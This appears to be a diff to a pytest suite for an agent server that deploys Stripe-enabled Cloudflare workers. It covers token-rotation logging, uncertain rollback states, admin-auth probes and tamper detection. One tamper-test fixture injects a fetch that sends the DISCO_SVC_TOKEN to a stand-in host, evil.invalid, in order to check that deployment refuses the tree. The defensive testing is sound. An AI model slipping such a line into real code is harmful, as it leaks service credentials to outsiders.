@@ -4,6 +4,7 @@ from __future__ import annotations
 
 import json
 from pathlib import Path
+from typing import Any, cast
 
 import httpx
 import pytest
@@ -20,7 +21,7 @@ from disco.agent_server.appkit_cloudflare.wrangler import (
     CommandResult,
 )
 from disco.agent_server.host_token_store import HostTokenStore
-from disco.core.appkit import generate, get_recipe, save_app_spec
+from disco.core.appkit import generate, get_recipe, save_app_spec, save_design_spec
 from disco.core.appkit.records_primitive import default_records_auth_app_spec
 from disco.core.appkit.spec import AppSpec, StripeMeta
 from disco.core.appkit.stripe_primitive import StripeSpec, apply_stripe_spec
@@ -124,11 +125,13 @@ async def test_lifecycle_installs_exact_order_and_rotates(stripe_runtime) -> Non
         probe=probe,
     )
     sink = _SecretSink()
+    token_mutations: list[str] = []
     await lifecycle.activate(
         deployed_url=_ORIGIN,
         admin_token=_ADMIN,
         fresh_worker=True,
         put_secret=sink,
+        record_mutation=token_mutations.append,
     )
     assert [name for name, _value in sink.calls] == [
         "STRIPE_RUNTIME_READY",
@@ -146,6 +149,10 @@ async def test_lifecycle_installs_exact_order_and_rotates(stripe_runtime) -> Non
     assert len(active) == 1
     assert active[0].allowed_services == frozenset({"payments.ready", "payments.checkout"})
     assert active[0].allowed_origins == frozenset({_ORIGIN})
+    assert token_mutations == [
+        "host_token_candidate_minted",
+        "host_token_rotation_finished",
+    ]
 
 
 @pytest.mark.parametrize("fail_at", range(1, 8))
@@ -213,18 +220,63 @@ async def test_probe_failure_revokes_candidate_and_preserves_old(stripe_runtime)
         probe=_Probe(False),
     )
     sink = _SecretSink()
+    token_mutations: list[str] = []
     with pytest.raises(StripeDeployError, match="payments.ready"):
         await lifecycle.activate(
             deployed_url=_ORIGIN,
             admin_token=_ADMIN,
             fresh_worker=False,
             put_secret=sink,
+            record_mutation=token_mutations.append,
         )
     await lifecycle.fail_closed(sink)
     assert tokens.verify(old) is not None
     records = tokens.list_for_conversation(_CID)
     assert len(records) == 2 and sum(record.is_active for record in records) == 1
     assert sink.calls[-1] == ("STRIPE_RUNTIME_READY", "0")
+    assert token_mutations == [
+        "host_token_candidate_minted",
+        "host_token_candidate_revoked",
+    ]
+
+
+@pytest.mark.parametrize("rollback_outcome", ["false", "exception"])
+async def test_failed_ready_zero_rollback_surfaces_uncertain_manual_state(
+    stripe_runtime,
+    rollback_outcome: str,  # noqa: ANN001
+) -> None:
+    secrets, configs, tokens = stripe_runtime
+    lifecycle = StripeDeploymentLifecycle(
+        app_spec=_app(),
+        owner_id=_OWNER,
+        conversation_id=_CID,
+        secret_store=secrets,
+        config_store=configs,
+        token_store=tokens,
+        probe=_Probe(False),
+    )
+
+    class Writer:
+        async def __call__(self, name: str, _value: str) -> bool:
+            if name != "STRIPE_RUNTIME_READY":
+                return True
+            if rollback_outcome == "exception":
+                raise RuntimeError("simulated ready-zero transport failure")
+            return False
+
+        def record_host_token_mutation(self, _name: str) -> None:
+            return None
+
+    error = await cf._activate_stripe_worker(
+        lifecycle,
+        deployed_url=_ORIGIN,
+        admin_token=_ADMIN,
+        fresh_worker=False,
+        writer=cast(Any, Writer()),
+    )
+    assert error is not None
+    assert error.step == "stripe_runtime_state_uncertain"
+    assert "manual intervention is required" in error.detail
 
 
 async def test_existing_worker_quiesce_failure_is_retried_fail_closed(stripe_runtime) -> None:  # noqa: ANN001
@@ -293,6 +345,53 @@ async def test_http_runtime_probe_is_exact_bounded_and_admin_authenticated(
     assert seen[0].headers["authorization"] == f"Bearer {_ADMIN}"
 
 
+@pytest.mark.integration
+async def test_http_probe_drives_generated_worker_admin_auth_semantics() -> None:
+    """Real generated Worker: bad admin is 401 and good admin reaches the probe body."""
+    import sys
+
+    core_tests = Path(__file__).resolve().parents[2] / "core" / "tests"
+    sys.path.insert(0, str(core_tests))
+    from _workerd_harness import WorkerdApp, wrangler_available
+
+    if not wrangler_available():
+        pytest.skip("wrangler/workerd is required for the integrated runtime probe")
+    recipe = get_recipe("editorial-ledger")
+    assert recipe is not None
+    stripe_spec = StripeSpec(
+        plan_name="Pro",
+        price_display="$9/mo",
+        entitlement_flag="pro_member",
+        success_message="Welcome to Pro.",
+    )
+    app = apply_stripe_spec(default_records_auth_app_spec("Probe", recipe), stripe_spec)
+    tree = generate(app, recipe.to_design_spec())
+    worker_port = _free_tcp_port()
+    with WorkerdApp(tree, admin_token=_ADMIN) as worker:
+        worker.boot(worker_port)
+        bad_status, _ = worker.get("/api/stripe/runtime-probe", token="wrong-admin-token")
+        assert bad_status == 401
+        good_status, good_body = worker.get("/api/stripe/runtime-probe", token=_ADMIN)
+        assert good_status == 200
+        assert json.loads(good_body) == {"ready": False}
+        # Drive the same real route with the production probe implementation.
+        probe = HttpStripeWorkerProbe()
+        origin = f"http://127.0.0.1:{worker_port}"
+        assert await probe.payments_ready(origin, "wrong-admin-token") is False
+        assert await probe.payments_ready(origin, _ADMIN) is False
+
+
+def _free_tcp_port() -> int:
+    import socket
+
+    sock = socket.socket()
+    try:
+        sock.bind(("127.0.0.1", 0))
+        return int(sock.getsockname()[1])
+    finally:
+        sock.close()
+
+
 class _Runner:
     def __init__(self) -> None:
         self.calls: list[dict[str, object]] = []
@@ -327,21 +426,63 @@ def _write_stripe_export(workspace: Path) -> AppSpec:
     recipe = get_recipe("editorial-ledger")
     assert recipe is not None
     base = default_records_auth_app_spec("Paid Records", recipe)
-    app = apply_stripe_spec(
-        base,
-        StripeSpec(
-            plan_name="Pro",
-            price_display="$9/mo",
-            entitlement_flag="pro_member",
-            success_message="Welcome to Pro.",
-        ),
+    stripe_spec = StripeSpec(
+        plan_name="Pro",
+        price_display="$9/mo",
+        entitlement_flag="pro_member",
+        success_message="Welcome to Pro.",
     )
-    for rel, body in generate(app, recipe.to_design_spec()).items():
+    app = apply_stripe_spec(base, stripe_spec)
+    design = recipe.to_design_spec()
+    for rel, body in generate(app, design).items():
         dest = workspace / rel
         dest.parent.mkdir(parents=True, exist_ok=True)
         dest.write_text(body, encoding="utf-8")
     save_app_spec(workspace, app)
+    save_design_spec(workspace, design)
+    provenance = workspace / ".disco" / "primitives" / "stripe.json"
+    provenance.parent.mkdir(parents=True, exist_ok=True)
+    provenance.write_text(
+        json.dumps(
+            {
+                "primitive_id": "stripe",
+                "tier": "template_only",
+                "applied_at": "2026-07-11T00:00:00Z",
+                "spec": stripe_spec.model_dump(mode="json"),
+            }
+        ),
+        encoding="utf-8",
+    )
     return app
+
+
+@pytest.mark.parametrize(
+    ("relpath", "mutate"),
+    [
+        (
+            "worker/disco-client.ts",
+            lambda text: text + '\nfetch("https://evil.invalid/?token=" + env.DISCO_SVC_TOKEN);\n',
+        ),
+        (
+            "wrangler.toml",
+            lambda text: text.replace('main = "worker/index.ts"', 'main = "worker/evil.ts"'),
+        ),
+    ],
+)
+def test_exact_stripe_trusted_tree_rejects_host_client_and_entrypoint_tampering(
+    tmp_path: Path,
+    relpath: str,
+    mutate,  # noqa: ANN001
+) -> None:
+    workspace = tmp_path / "workspace"
+    workspace.mkdir()
+    _write_stripe_export(workspace)
+    target = workspace / relpath
+    target.write_text(mutate(target.read_text(encoding="utf-8")), encoding="utf-8")
+    with pytest.raises(cf.DeployRefused) as caught:
+        cf._assert_stripe_trusted_tree(workspace)
+    assert caught.value.reason is cf.RefusalReason.STRIPE_TRUSTED_TREE
+    assert relpath in caught.value.detail
 
 
 async def test_full_deploy_runner_order_and_records_contain_names_not_values(
@@ -410,5 +551,8 @@ async def test_full_deploy_runner_order_and_records_contain_names_not_values(
     rendered = json.dumps(result.transcript) + persisted
     assert webhook not in rendered and _ADMIN not in rendered
     assert "secret_put:STRIPE_WEBHOOK_SECRET" in persisted
+    assert "host_token_candidate_minted" in persisted
+    assert "host_token_rotation_finished" in persisted
+    assert "a2v0." not in persisted
     tokens.close()
     configs.close()
